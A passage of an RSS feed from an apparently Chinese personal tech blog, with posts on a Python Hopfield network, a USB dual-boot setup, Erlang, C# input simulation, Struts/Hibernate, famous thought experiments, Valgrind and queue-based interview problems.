id="selType"&gt;<br>&lt;option id='allType'&gt;所有车间&lt;/option&gt;<br>&lt;option&gt;A车间&lt;/option&gt;<br>&lt;option&gt;B车间&lt;/option&gt;<br>&lt;/select&gt;<br>&lt;table&gt;<br>&lt;tr class="所有车间 A车间"&gt;&lt;td&gt;1&lt;/td&gt;&lt;/tr&gt;<br>&lt;tr class="所有车间 B车间"&gt;&lt;td&gt;2&lt;/td&gt;&lt;/tr&gt;<br>&lt;tr class="所有车间 A车间"&gt;&lt;td&gt;3&lt;/td&gt;&lt;/tr&gt;<br>&lt;tr class="所有车间 B车间"&gt;&lt;td&gt;4&lt;/td&gt;&lt;/tr&gt;<br>&lt;tr class="所有车间 C车间"&gt;&lt;td&gt;5&lt;/td&gt;&lt;/tr&gt;<br>&lt;tr class="所有车间 A车间"&gt;&lt;td&gt;6&lt;/td&gt;&lt;/tr&gt;<br>&lt;tr class="所有车间 A车间"&gt;&lt;td&gt;7&lt;/td&gt;&lt;/tr&gt;<br>&lt;tr class="所有车间 B车间"&gt;&lt;td&gt;8&lt;/td&gt;&lt;/tr&gt;<br>&lt;tr class="所有车间 A车间"&gt;&lt;td&gt;9&lt;/td&gt;&lt;/tr&gt;<br>&lt;tr class="所有车间 A车间"&gt;&lt;td&gt;10&lt;/td&gt;&lt;/tr&gt;<br>&lt;tr class="所有车间 B车间"&gt;&lt;td&gt;11&lt;/td&gt;&lt;/tr&gt;<br>&lt;/table&gt;<br>&lt;div id="pageLabel"&gt;&lt;/div&gt;]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Web Skills</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720091016103116132/</guid>
    </item>
    <item>
      <title>
<![CDATA[神经网络之Hopfield]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372010614105249188/</link>
      <description>
<![CDATA[Hopfield 是最简单的神经网络之一，是一种单层神经网络。<br>方法比较也很简单<br>训练：<br>首先将weight矩阵初始为0，然后对每个样本：<br>1.1. 将输入的true/false转变为1/-1，生成向量mat<br>1.2. 将mat转置后再乘以mat，得到矩阵w<br>1.3. 将矩阵w的对角线元素设置为0<br>1.4. 将weight矩阵加上w矩阵<br><br>计算：<br>2.1 将输入的true/false转变为1/-1，生成向量input<br>2.2 将input乘以weight，得到向量v<br>2.3 对向量v的每个元素，如果&gt;0，输出为true，否则为false<br><br>代码：<br>#!/usr/bin/python<br>class Hopfield:<br>&nbsp;&nbsp;&nbsp; def __init__(self,n):<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; self.n=n<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; self.weight=[[0 for j in range(n)] for i in range(n)]<br>&nbsp;&nbsp;&nbsp; def train(self,input):#训练<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mat=[x and 1 or -1 for x in input] #1.1<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; res=[[0 for j in range(self.n)] for i in range(self.n)]<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for i in range(self.n):<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for j in range(self.n):<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if i!=j: #1.3<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; self.weight[i][j]+=mat[i]*mat[j] #1.2 1.4<br><br>&nbsp;&nbsp;&nbsp; def pred(self,input):<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mat=[x and 1 or -1 for x in input] #2.1<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; res=[0 for i in range(self.n)]<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for i in range(self.n):<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for j in range(self.n):<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; res[i]+=mat[j]*self.weight[j][i] #2.2<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ret=[x&gt;0 and True or False for x in res] #2.3<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return ret<br><br>if __name__=='__main__':<br>&nbsp;&nbsp;&nbsp; #input 1 输入<br>&nbsp;&nbsp;&nbsp; input1=[False, True, False, True]<br>&nbsp;&nbsp;&nbsp; input2=[True, False, False, True]<br>&nbsp;&nbsp;&nbsp; input3=[True, False, True, False] #no need to train, it is mirror of 1<br>&nbsp;&nbsp;&nbsp; #train 训练<br>&nbsp;&nbsp;&nbsp; net=Hopfield(4)<br>&nbsp;&nbsp;&nbsp; net.train(input1)<br>&nbsp;&nbsp;&nbsp; net.train(input2)<br>&nbsp;&nbsp;&nbsp; #classification with train result 计算<br>&nbsp;&nbsp;&nbsp; out1=net.pred(input1)<br>&nbsp;&nbsp;&nbsp; out2=net.pred(input2)<br>&nbsp;&nbsp;&nbsp; out3=net.pred(input3)<br>&nbsp;&nbsp;&nbsp; print out1<br>&nbsp;&nbsp;&nbsp; print out2<br>&nbsp;&nbsp;&nbsp; print out3]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>other</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372010614105249188/</guid>
    </item>
    <item>
      <title>
<![CDATA[8G U盘制作Ubuntu+WinPE双启动盘]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937200937115251232/</link>
      <description>
<![CDATA[思路:<br>使用Ubuntu将U盘分为两个区, 一个FAT32, 一个ext3, 然后使用Grub引导<br>用到的软件:<br>vmware5.5绿色版 ubuntu-8.04-server-i386.iso grub4dos WinPE<br>步骤<br>1. 在vmware中新建虚拟机, 使用物理硬盘也就是8GU盘作为硬盘, 然后从ubuntu镜像开始安装, 分区时先分一个5G的FAT32主分区, 挂载为/dos,设为启动分区, 然后创建一个3G的扩展分区, ext3挂载为/<br>2. 安装完成后已经可以进入ubuntu了, 修改/boot/grub/menu.lst, 加入DOS和WinPE启动项<br>title win98<br>root hd(0,0)<br>kernel /boot/grub/memdisk.gz<br>initrd /boot/grub/win99.zip<br><br>title WinPE<br>root hd(0,0)<br>chainloader /grldr<br>boot<br>3. 将压缩包内的文件解压缩到/dos分区即可<br>压缩包下载地址: http://dl.getdropbox.com/u/194885/U.rar<br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Unix</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937200937115251232/</guid>
    </item>
    <item>
      <title>
<![CDATA[Erlang入门]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720078710251198/</link>
      <description>
<![CDATA[<DIV><FONT face=Verdana>Erlang不但是一种编程语言，而且它具有比编程语言更加贴近操作系统的一些特性：并发线程、作业调度、内存管理、分布式、网络化等。它具有超强的轻量级进程，这种进程对内存的需求是动态变化的。Erlang支持超大量级的并发线程，并且不需要操作系统具有并发机制。据说使用Erlang编写的Yaws Web服务器，其并发性能是apache的15倍</FONT></DIV>
<DIV><FONT face=Verdana></FONT>&nbsp;</DIV>
<DIV><FONT face=Verdana>Erlang具有以下特性：<BR><BR><B>并发性</B> - Erlang具有超强的轻量级进程，这种进程对内存的需求是动态变化的，并且它没有共享内存和通过异步消息传送的通讯。Erlang支持超大量级的并发线程，并且不需要操作系统具有并发机制。<BR><BR><B>分布式</B> - Erlang被设计用于运行在分布式环境下。一个Erlang虚拟机被成为Erlang节点。一个分布式Erlang系统是多个Erlang节点组成的网络（通常每个处理器被作为一个节点）。一个Erlang节点能够创建运行在其它节点上的并行线程，而其它节点可以使用其它操作系统。线程依赖不同节点之间的通讯，这完全和它依赖于单一节点一样。<BR><BR><B>健壮性</B> - Erlang具有多种基本的错误检测能力，它们能够用于构建容错系统。例如，进程能够监控其它进程的状态和活动，甚至这些进程是在其它节点上执行。在分布式系统中的线程能够配置为在其它节点故障的情况下自动进行故障恢复，并在故障节点恢复时自动迁移回到恢复节点。<BR><BR><B>软实时性</B> - Erlang支持可编程的“软”实时系统，这种系统需要反应时间在毫秒级。而在这种系统中，长时间的垃圾收集（garbage collection）延迟是无法接受的，因此Erlang使用了递增式垃圾收集技术。<BR><BR><B>热代码升级</B> - 一些系统不能够由于软件维护而停止运行。Erlang允许程序代码在运行系统中被修改。旧代码能被逐步淘汰而后被新代码替换。在此过渡期间，新旧代码是共存的。这也使得安装bug补丁、在运行系统上升级而不干扰系统操作成为了可能。<BR><BR><B>递增式代码装载</B> - 用户能够控制代码如何被装载的细节。在嵌入式系统中，所有代码通常是在启动时就被完全装载。而在开发系统中，代码是按需装载的，甚至在系统运行时被装载的。如果测试到了未覆盖的bug，那么只有具有bug的代码需要被替换。<BR><BR><B>外部接口</B> - Erlang进程与外部世界之间的通讯使用和在Erlang进程之间相同的消息传送机制。这种机制被用于和操作系统通讯、与其它语言编写的程序交互。如果出于高效率的需要，这种机制的一个特殊版本也允许例如C程序这样的代码直接链接到Erlang运行时系统中来。<BR></FONT></DIV>
<DIV><FONT face=Verdana>--Erlang的语法简洁性导致了代码可读性的下降，如果能在两者之间稍加平衡的话，可能其流行度会得到不少提升。也许是Erlang过于注重性能了，把性能作为其core business了。</FONT></DIV></FONT>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>NewTech</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720078710251198/</guid>
    </item>
    <item>
      <title>
<![CDATA[C#模拟鼠标和键盘]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720095454037164/</link>
      <description>
<![CDATA[模拟鼠标和键盘<br>模拟鼠标：<br>[DllImport("user32")]<br>public static extern void mouse_event(int dwFlags, int dx, int dy, int dwData, int dwExtraInfo);<br>dwFlags: 鼠标类型&nbsp; 0x2(按下左键) 0x4(松开左键) 0x8(按下右键) 0x10(松开右键)<br>dx, dy: 鼠标位置<br>dwData, dwExtraInfo; 可以都用0<br><br>模拟键盘<br>Keyboard.SetState(Keyboard.VirtualKeys.VK_CAPITAL, !Keyboard.GetState(Keyboard.VirtualKeys.VK_CAPITAL));<br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Develop</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720095454037164/</guid>
    </item>
    <item>
      <title>
<![CDATA[初用Struts&amp;Hibernate的困惑]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937200921511210205/</link>
      <description>
<![CDATA[首先说Struts1.3.8,每一个框架的产生都是为了解决一些问题,但是不可避免的在解决问题的时候带来新的问题,尤其是你对这个框架越不熟悉,遇到的问题越多,最后甚至会产生"还不如不用框架呢"的想法.这里记录下遇到的一些问题和struts的解决之道:<br>1. 一个分类Category里有多个博客Blog, 在类中, 分类Category是博客Blog的一个属性, 而id和name是分类Category的属性. 现在在request.attribute里一个博客Blog的实例blog, 要创建一个到Category的超链接:<br>&lt;nested:root name="blog"&gt;<br>&lt;nested:nested name="category"&gt;<br>&lt;nested:link action="/category" paramId="id" paramName="category" paramProperty="id"/&gt;<br>&lt;/nested:nested&gt;<br>&lt;/nested:root&gt;<br><br>2.在分类列表里,每个分类显示分类的名字,并有超链接指向分类的列表页面, 怎样进入列表?<br>使用Action,每个超链接指向Action,在Action里获得Blog列表,并request.setAttribute(),最后在列表页面用iterate显示<br><br>然后再看Hibernae3.2<br>1.问题一:保存后并未持久化到数据库:UserDAO dao = new UserDAO(); User user = new User(); dao.save(user);<br>然后去数据库里看,并没有插入,这是为什么呢?因为connection.auto_commit属性默认是false的,也就是说它并没有提交这个操作,解决方式有两个<br>一是修改hibernate.cfg.xml,设置connection.auto_commit为true<br>另一个是在save前 Transaction t=dao.getSession().beginTransaction(), 然后在save后t.commit()<br><br>2.问题二: 添加Blog后,Category仍然保持不变<br>Hibernate的缓存机制,使得使用BlogDAO的delete方法添加新Blog后,Category里仍然还是原来的的Blog对象集合,目前的方法是显示调用失效缓存的函数 dao.getSesion().evict(category),另一个方法是直接调用category.getBlogs().add() 这种方法理论上可行,没有试验过<br><br>3 问题三:删除Blog后,Category仍然保持不变<br>这个问题目前还没有解决,<br><br>最后看Struts怎样和Hibernate合作<br>双剑合璧: 使用Hibernate反向工程从表生成对象,Blog(id int, title varchar, content text, category Category), 然后直接修改这个类,让他继承ActionForm, 然后就可以直接被Struts使用了. 这是自己琢磨出来的方法,不过应该属于"QQ可以隐身"之流.<br>问题: 但是问题随之而来, category属性是"类",然后Struts就会尝试把HTML的Form传过来的categoryID赋给category属性,把一个字符串赋给一个类,肯定出错了,但我们却没有办法阻止这个赋值,因为这个赋值在预处理过程里,怎么办呢?<br>给这个Blog对象增加一个属性: int categoryId,然后给他加上@Transient,在Action里用CategoryDAO根据这个id获取Category对象并赋给form<br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Web Skills</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937200921511210205/</guid>
    </item>
    <item>
      <title>
<![CDATA[[zz]10个著名的思想实验]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372010629103132608/</link>
      <description>
<![CDATA[10.电车难题（The Trolley Problem） <br>“电车难题”要数伦理学领域最为知名的思想实验之一，其内容大致是：一个疯子把五个
无辜的人绑在电车轨道上。一辆失控的电车朝他们驶来，并且片刻 
后就要碾压到他们。幸运的是，你可以拉一个拉杆，让电车开到另一条轨道上。但是还有一个问题，那个疯子在那另一条轨道上也绑了一个人。考虑以上状况，你应
 该拉拉杆吗？ <br><br>解读： <br>电车难题最早是由哲学家Philippa 
Foot提出的，用来批判伦理哲学中的主要理论，特别是功利主义。功利主义提出的观点是，大部分道德决策都是根据“为最多的人提供最大的利益”的原则做出
 
的。从一个功利主义者的观点来看，明显的选择应该是拉拉杆，拯救五个人只杀死一个人。但是功利主义的批判者认为，一旦拉了拉杆，你就成为一个不道德行为的
 
同谋——你要为另一条轨道上单独的一个人的死负部分责任。然而，其他人认为，你身处这种状况下就要求你要有所作为，你的不作为将会是同等的不道德。总之，
 
不存在完全的道德行为，这就是重点所在。许多哲学家都用电车难题作为例子来表示现实生活中的状况经常强迫一个人违背他自己的道德准则，并且还存在着没有完
 全道德做法的情况。 <br><br>9．空地上的奶牛（The Cow in the field） <br>认知论领域的一个最重要的思想实验就是
“空地上的奶牛”。它描述的是，一个农民担心自己的获奖的奶牛走丢了。这时送奶工到了农场，他告诉农民不要 
担心，因为他看到那头奶牛在附件的一块空地上。虽然农民很相信送奶工，但他还是亲自看了看，他看到了熟悉的黑白相间的形状并感到很满意。过了一会，送奶工
 
到那块空地上再次确认。那头奶牛确实在那，但它躲在树林里，而且空地上还有一大张黑白相间的纸缠在树上，很明显，农民把这张纸错当成自己的奶牛了。问题是
 出现了，虽然奶牛一直都在空地上，但农民说自己知道奶牛在空地上时是否正确？ <br><br>解读： <br>空地上的奶牛最初是被Edmund 
Gettier用来批判主流上作为知识的定义的JTB（justified true 
belief）理论，即当人们相信一件事时，它就成为了知识；这件事在事实上是真的，并且人们有可以验证的理由相信它。在这个实验中，农民相信奶牛在空地
 
上，且被送奶工的证词和他自己对于空地上的黑白相间物的观察所证实。而且经过送奶工后来的证实，这件事也是真实的。尽管如此，农民并没有真正的知道奶牛在
 那儿，因为他认为奶牛在那儿的推导是建立在错误的前提上的。Gettier利用这个实验和其他一些例子，解释了将知识定义为JTB的理论需要修正。 <br><br>8．定时炸弹（The Ticking Time Bomb） <br>如果你关注近几年的政治时事，或者看过动作电影，那么你对于“定时炸弹”思想实验肯定很熟悉。它要求你想象一个炸弹或其他大规模杀伤性武器藏在你的城市中，并且爆炸的倒计时马上就到零了。在羁押中有一个知情者，他知道炸弹的埋藏点。你是否会使用酷刑来获取情报？ <br><br>解读： <br>与
电车难题类似，定时炸弹情景也是强迫一个人从两个不道德行径中选择的伦理问题。它一般被用作对那些说在任何情况下都不能使用酷刑的反驳。它也被 
用作在极端形势下法律——就像美国的严禁虐囚的法律——可以被放在第二位的例子。归功于像《24小时》的电视节目和各种政治辩论，定时炸弹情景已成为最常
 
引用的思想实验之一。今年早些时候，一份英国报纸提出了更为极端的看法。这份报纸提议说，如果那个恐怖分子对酷刑毫无反应，那么当局者是否愿意拷打他的妻
 子儿女来获取情报。 <br><br>7．爱因斯坦的光线（Einstein’s Light Beam） <br>爱因斯坦著名的狭义相对论是受启于
他16岁做的思想实验。在他的自传中，爱因斯坦回忆道他当时幻想在宇宙中追寻一道光线。他推理说，如果他能够以 
光速在光线旁边运动，那么他应该能够看到光线成为“在空间上不断振荡但停滞不前的电磁场”。对于爱因斯坦，这个思想实验证明了对于这个虚拟的观察者，所有
 的物理定律应该和一个相对于地球静止的观察者观察到的一样。<br>解读： <br>事实上，没人确切知道这意味着什么。科学家一直都在争论一个如此简单的思想实验是如此帮助爱因斯坦完成到狭义相对论这如此巨大的飞跃的。在当时，这个实验中的想法与现在已被抛弃的“以太”理论相违背。但他经过了好多年才证明了自己是正确的。 <br><br>6．特修斯之船（The Ship of Theseus） <br>最
为古老的思想实验之一。最早出自普鲁塔克的记载。它描述的是一艘可以在海上航行几百年的船，归功于不间断的维修和替换部件。只要一块木板腐烂 
了，它就会被替换掉，以此类推，直到所有的功能部件都不是最开始的那些了。问题是，最终产生的这艘船是否还是原来的那艘特修斯之船，还是一艘完全不同的 
船？如果不是原来的船，那么在什么时候它不再是原来的船了？哲学家Thomas 
Hobbes后来对此进来了延伸，如果用特修斯之船上取下来的老部件来重新建造一艘新的船，那么两艘船中哪艘才是真正的特修斯之船？ <br><br>解读： <br>对
于哲学家，特修斯之船被用来研究身份的本质。特别是讨论一个物体是否仅仅等于其组成部件之和。一个更现代的例子就是一个不断发展的乐队，直到某 
一阶段乐队成员中没有任何一个原始成员。这个问题可以应用于各个领域。对于企业，在不断并购和更换东家后仍然保持原来的名字。对于人体，人体不间断的进行
 着新陈代谢和自我修复。这个实验的核心思想在于强迫人们去反思身份仅仅局限在实际物体和现象中这一常识。 <br><br>5．伽利略的重力实验（Galileo’s Gravity Experiment） <br>为
了反驳亚里士多德的自由落体速度取决于物体的质量的理论，伽利略构造了一个简单的思想实验。根据亚里士多德的说法，如果一个轻的物体和一个重的 
物体绑在一起然后从塔上丢下来，那么重的物体下落的速度快，两个物体之间的绳子会被拉直。这时轻的物体对重物会产生一个阻力，使得下落速度变慢。但是，从
 另一方面来看，两个物体绑在一起以后的质量应该比任意一个单独的物体都大，那么整个系统下落的速度应该最快。这个矛盾证明了亚里士多德的理论是错误的。
 <br><br>解读： <br>这个思想实验帮助证明了一个很重要的理论：无论物体的质量，不考虑阻力的情况下，所有物体自由落体的速率都是一样的。 <br><br>4．猴子和打字机（Monkeys and Typewriters） <br>另
一个在流行文化中占了很大分量的思想实验是“无限猴子定理”，也叫做“猴子和打字机”实验。定理的内容是，如果无数多的猴子在无数多的打字机上 
随机的打字，并持续无限久的时间，那么在某个时候，它们必然会打出莎士比亚的全部著作。猴子和打字机的设想在20世纪初被法国数学家Emile 
Borel推广，但其基本思想——无数多的人员和无数多的时间能产生任何/所有东西——可以追溯至亚里士多德。 <br><br>解读： <br>简单来
说，“猴子和打字机”定理是用来描述无限的本质的最好方法之一。人的大脑很难想象无限的空间和无限的时间，无限猴子定理可以帮助理解这些概 
念可以达到的宽度。猴子能碰巧写出《哈姆雷特》这看上去似乎是违反直觉，但实际上在数学上是可以证明的。这个定理本身在现实生活中是不可能重现的，但这并
 
没有阻止某些人的尝试：2003年，一家英国动物园的科学家们“试验”了无限猴子定理，他们把一台电脑和一个键盘放进灵长类园区。可惜的是，猴子们并没有
 打出什么十四行诗。根据研究者，它们只打出了5页几乎完全是字母“s”的纸。 <br><br>3．中文房间（The Chinese Room） <br>“中
文房间”最早由美国哲学家John 
Searle于20世纪80年代初提出。这个实验要求你想象一位只说英语的人身处一个房间之中，这间房间除了门上有一个小窗口以外，全部都是封闭的。他随
 
身带着一本写有中文翻译程序的书。房间里还有足够的稿纸、铅笔和橱柜。写着中文的纸片通过小窗口被送入房间中。根据Searle，房间中的人可以使用他的
 书来翻译这些文字并用中文回复。虽然他完全不会中文，Searle认为通过这个过程，房间里的人可以让任何房间外的人以为他会说流利的中文。<br>解读： <br>Searle创造了“中文房间”思想实验来反驳电脑和其他人工智能能够真正思考的观点。房间里的人不会说中文；他不能够用中文思
考。但因为他拥有 
某些特定的工具，他甚至可以让以中文为母语的人以为他能流利的说中文。根据Searle，电脑就是这样工作的。它们无法真正的理解接收到的信息，但它们可
 以运行一个程序，处理信息，然后给出一个智能的印象。 <br><br>2．薛定锷的猫（Schrodinger’s Cat） <br>薛定锷的猫最
早由物理学家薛定锷提出，是量子力学领域中的一个悖论。其内容是：一只猫、一些放射性元素和一瓶毒气一起被封闭在一个盒子里一个小 
时。在一个小时内，放射性元素衰变的几率为50%。如果衰变，那么一个连接在盖革计数器上的锤子就会被触发，并打碎瓶子，释放毒气，杀死猫。因为这件事会
 否发生的概率相等，薛定锷认为在盒子被打开前，盒子中的猫被认为是既死又活的。 <br><br>解读： <br>简而言之，这个实验的核心思想是因为
事件发生时不存在观察者，盒子里的猫同时存在在其所有可能的状态中（既死又活）。薛定锷最早提出这个实验是在 
回复一篇讨论量子态叠加的文章时。薛定锷的猫同时也说明了量子力学的理论是多么令人无法理解。这个思想实验因其复杂性而臭名昭著，同时也启发了各种各样的
 解释。其中最奇异的就属“多重世界”假说，这个假说表示有一只死猫和一只活猫，两只猫存在在不同的宇宙之中，并且永远不会有交集。 <br><br>1． 缸中的大脑（Brain in a Vat） <br>没
有比所谓的“缸中的大脑”假说更有影响力的思想实验了。这个思想实验涵盖了从认知学到哲学到流行文化等各个领域。这个实验的内容是：想象有一个 
疯狂科学家把你的大脑从你的体内取出，放在某种生命维持液体中。大脑上插着电极，电极连到一台能产生图像和感官信号的电脑上。因为你获取的所有关于这个世
 
界的信息都是通过你的大脑来处理的，这台电脑就有能力模拟你的日常体验。如果这确实可能的话，你要如何来证明你周围的世界是真实的，而不是由一台电脑产生
 的某种模拟环境？ <br><br>解读： <br>如果你觉得这听起来很像《黑客帝国》，那么你说对了。这部电影以及其他一些科幻作品，都是在这个思
想实验的影响下创作出来的。这个实验的核心思想 
是让人们质疑自身经历的本质，并思考作为一个人的真正意义是什么。这个实验的最初原型可以一直追溯至笛卡尔。在他的《Meditations on 
the First 
Philosophy》一书中，笛卡尔提出了能否证明他所有的感官体验都是他自己的，而不是由某个“邪恶的魔鬼”产生的这样的疑问。笛卡尔用他的经典名言
 
“我思故我在”来回答这个问题。不幸的是，“缸中的大脑”实验更为复杂，因为连接着电极的大脑仍然可以思考。这个实验被广泛的讨论着，有许多对于此实验前
 提的反驳，但仍没有人能有力的回应其核心问题：你究竟如何才能知道什么是真实？]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>other</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372010629103132608/</guid>
    </item>
    <item>
      <title>
<![CDATA[Ubuntu也会骂人的]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720095593953218/</link>
      <description>
<![CDATA[#启动insults，在Defaults的最后加上insults,用逗号分开<br>sudo visudo<br>Defaults&nbsp;&nbsp;&nbsp; env_reset,insults<br>#清空密码<br>sudo -K<br>sudo pwd<br>#试一下故意输错密码<br>[sudo] password for hankjin:<br>Have a gorilla...<br>[sudo] password for hankjin:<br>There's a lot of it about, you know.<br>[sudo] password for hankjin:<br>Ying Tong Iddle I Po<br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Unix</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720095593953218/</guid>
    </item>
    <item>
      <title>
<![CDATA[在Linux下用Valgrind检查内存泄露]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937201051093816201/</link>
      <description>
<![CDATA[首先安装 sudo apt-get install valgrind<br>然后写一个内存泄露的程序<br>#include &lt;stdlib.h&gt;<br>int main()<br>{<br>&nbsp;int *p = (int*)malloc(sizeof(int));<br>&nbsp;return 0;<br>}<br>编译<br>gcc -g test.c<br>测试<br>valgrind --leak-check=full ./a.out 2&gt;&amp;1 | grep test.c<br>==21515==&nbsp;&nbsp;&nbsp; by 0x80483E0: main (test.c:4)<br>好了，去test.c的第四行看吧<br>注意：<br>1.编译的时候加-g选项，添加调试信息<br>2.运行的时候加--leak-check=full选项，否则有些内存泄露检查不出来 ！]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Develop</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937201051093816201/</guid>
    </item>
    <item>
      <title>
<![CDATA[梦里不知身是客、半晌贪欢]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720136151259985/</link>
      <description>
<![CDATA[<div>习睡少而好，少梦。</div>今晨六点醒，窗外雨，困，翻身入梦。<div>故乡，小学同学们，过池塘，跳而皆落水，唯余免，继而醒，已九点。</div><div><br><wbr></div>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Mood</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720136151259985/</guid>
    </item>
    <item>
      <title>
<![CDATA[低效的SGMLParser]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720098934027784/</link>
      <description>
<![CDATA[解析一个37K的html文件，循环执行1000次，竟然要用1分零8秒，而且整个过程CPU占用都是100%<br>为什么SGMLParser的效率如此低下，而CPU占用率如此之高？<br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Develop</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720098934027784/</guid>
    </item>
    <item>
      <title>
<![CDATA[笔试(1)-队列的使用]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937201092481723463/</link>
      <description>
<![CDATA[<b>分页</b><br>一次网页搜索的结果可能包含来自不同网站的不同网页。<br>例如，搜索Java关键字，可能搜到20条来自网站a的网页，和30条来自网站b的网页，还有40条来自其它网站的网页。<br>排序结果可能是：a b a a b k a a c d a y k<br>如果要每页显示5条，每页只显示同一网站的2条结果。其它的结果放到下一页。<br>如上例所示，前5条为 a b a a b，有3条来自网站a的结果，所以要把最后一个来自网站a的网页放入第二页，并把第六条结果k放入第一页。<br>问题是，如何设计一种方式，实现这种检查和调整？<br><b>解决方案一：</b><br>首先统计每个网站出现的次数，如果大于2，则放入下一页，。。。<br>第一轮，前五个为：a b a a b，统计a有3个，b有2个，所以要把最后一个a放入下一页，将第6个网页k提出来，然后将a放入第6个的位置。<br>输出a b a b k, 剩余网站为 a a a c d a y k<br>第二轮，前一个为 a a a c d，发现a有3个，需要将a放入第6个，但第6个网页还是a，所以要放入第7个，并把第7个的y提出来，然后将第6个a放入第7个的位置，再将第三个a放入第6个的位置。<br>输出a a y c d,剩余网站为a a k<br>可以看出，这种方案极其繁琐。编程很难实现，可能还要用回溯递归之类的操作。<br>下面使用队列的思想完成这个操作。<br><b>解决方案二：</b><br>做一个队列，然后从头开始，输出并计算每个网站的网页数，如果这个网站的网页数已经够两个，则将其它的加入队列。每页输出结束后，将队列加到剩余网站的开头。<br>同样用前面的数据a b a a b k a a c d a y k，<br>输出a b a，然后发现第4个网页也是a，而a已经出现2次了，则将第4个网页加入队列，继续输出 b k<br>第一次运行结束后，输出为a b a b k<br>队列为a<br>剩余网页为 a a c d a y k<br>将队列加入剩余网页的开头，然后清空队列，剩余网页变成a a a c d a y k<br>输出a a，再将下一个a加入队列，继续输出c d,再将下一个a加入队列，继续输出y<br>第二次运行结束后，输出为a a c d y<br>队列为a a <br>剩余网页为 k<br>将队列加入剩余网页头，然后清空队列，剩余网页变成a a k，结束。<br><br><b>任务分配</b><br>A可以完成类型为1或3的任务，B可以完成类型为2或3的任务。A一共可以完成x个任务，B一共可以完成y个任务。<br>现在有N个任务，按价值从高到低的顺序排列。如何给分配任务给A和B，使A和B完成的任务总价值最大。<br><b>解决方案一：</b><br>创建三个队列，q1, q2, q3。<br>然后依次读入每个任务t。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 如果任务类型是1<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp; &nbsp; &nbsp;&nbsp; 如果q1==x，读入下一个任务<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 否则 将t加入q1<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 如果任务类型是2<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 如果q2==y，读入下一个任务<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 否则 将t加入q2<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 